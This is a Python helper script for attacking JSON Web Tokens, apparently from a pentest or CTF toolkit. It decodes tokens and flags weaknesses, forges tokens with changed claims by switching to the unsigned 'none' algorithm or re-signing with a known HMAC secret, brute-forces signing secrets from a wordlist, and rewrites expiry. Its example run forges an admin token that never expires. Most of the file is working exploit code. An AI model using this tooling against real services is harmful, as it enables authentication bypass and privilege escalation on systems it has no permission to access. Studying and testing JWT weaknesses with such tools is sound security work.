#!/usr/bin/env python3
"""
JWT Helper Script
=================
Helper functions for analyzing and forging JWT tokens.

Usage:
    from scripts.jwt_helper import analyze_token, forge_token
    analyze_token("eyJ...")
    new_token = forge_token(old_token, {"admin": True})
"""

import json
import base64
import hmac
import hashlib
from typing import Dict, Optional, Tuple
from datetime import datetime, timedelta


def decode_jwt_part(part: str) -> Optional[Dict]:
    """Decode base64 URL-safe JWT component"""
    try:
        # Add padding if needed
        padding = 4 - len(part) % 4
        if padding != 4:
            part += "=" * padding
        
        decoded = base64.urlsafe_b64decode(part)
        return json.loads(decoded)
    except Exception as e:
        print(f"[!] Decode error: {e}")
        return None


def encode_jwt_part(obj: Dict) -> str:
    """Encode dictionary to base64 URL-safe JWT component"""
    json_str = json.dumps(obj, separators=(',', ':'))
    encoded = base64.urlsafe_b64encode(json_str.encode()).decode()
    return encoded.rstrip("=")


def analyze_token(token: str) -> Dict:
    """Analyze JWT token for vulnerabilities"""
    parts = token.split(".")
    
    if len(parts) != 3:
        return {"error": "Invalid JWT format (not 3 parts)"}
    
    header = decode_jwt_part(parts[0])
    payload = decode_jwt_part(parts[1])
    
    if not header or not payload:
        return {"error": "Could not decode JWT parts"}
    
    vulnerabilities = []
    
    # Check for none algorithm
    if header.get("alg") == "none":
        vulnerabilities.append("CRITICAL: Algorithm is 'none'")
    
    # Check for missing expiration
    if "exp" not in payload:
        vulnerabilities.append("WARNING: No expiration claim")
    elif payload["exp"] < datetime.now().timestamp():
        vulnerabilities.append("WARNING: Token expired")
    
    # Check for admin/role claims
    if "admin" in payload or "role" in payload:
        vulnerabilities.append("NOTE: Authorization claims detected")
    
    return {
        "header": header,
        "payload": payload,
        "signature": parts[2],
        "vulnerabilities": vulnerabilities,
        "valid_structure": True
    }


def forge_token(token: str, new_payload: Dict, secret: Optional[str] = None) -> str:
    """
    Forge new JWT with modified payload
    
    Args:
        token: Original token
        new_payload: Modified claims
        secret: HMAC secret (if None, uses "none" algorithm)
    
    Returns:
        forged_token: New JWT
    """
    parts = token.split(".")
    
    if len(parts) != 3:
        raise ValueError("Invalid JWT format")
    
    # Get original header
    header = decode_jwt_part(parts[0])
    
    # Modify header if using "none" algorithm
    if secret is None:
        header["alg"] = "none"
    
    # Encode header and payload
    new_header = encode_jwt_part(header)
    new_payload_encoded = encode_jwt_part(new_payload)
    
    message = f"{new_header}.{new_payload_encoded}"
    
    if secret is None:
        # No signature for "none" algorithm
        new_signature = ""
    else:
        # HMAC signature
        signature = base64.urlsafe_b64encode(
            hmac.new(
                secret.encode(),
                message.encode(),
                hashlib.sha256
            ).digest()
        ).decode().rstrip("=")
        new_signature = signature
    
    return f"{new_header}.{new_payload_encoded}.{new_signature}"


def brute_force_secret(token: str, wordlist: list) -> Optional[str]:
    """
    Attempt to brute-force JWT secret
    
    Args:
        token: JWT token
        wordlist: List of secret candidates
    
    Returns:
        secret: Found secret or None
    """
    parts = token.split(".")
    
    if len(parts) != 3:
        return None
    
    header_part = parts[0]
    payload_part = parts[1]
    given_signature = parts[2]
    
    for candidate in wordlist:
        # Generate HMAC
        message = f"{header_part}.{payload_part}"
        signature = base64.urlsafe_b64encode(
            hmac.new(
                candidate.encode(),
                message.encode(),
                hashlib.sha256
            ).digest()
        ).decode().rstrip("=")
        
        if signature == given_signature:
            print(f"[+] Secret found: {candidate}")
            return candidate
    
    return None


def modify_expiration(token: str, new_exp: int) -> Dict:
    """Modify token expiration"""
    parts = token.split(".")
    payload = decode_jwt_part(parts[1])
    
    payload["exp"] = new_exp
    
    return payload


# Example usage
if __name__ == "__main__":
    # Analyze token
    test_token = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIn0."
    print("[*] Analyzing token...")
    analysis = analyze_token(test_token)
    print(json.dumps(analysis, indent=2))
    
    # Forge token
    print("\n[*] Forging token...")
    new_payload = {"sub": "1", "admin": True, "exp": 9999999999}
    forged = forge_token(test_token, new_payload, secret=None)
    print(f"[+] Forged token: {forged}")
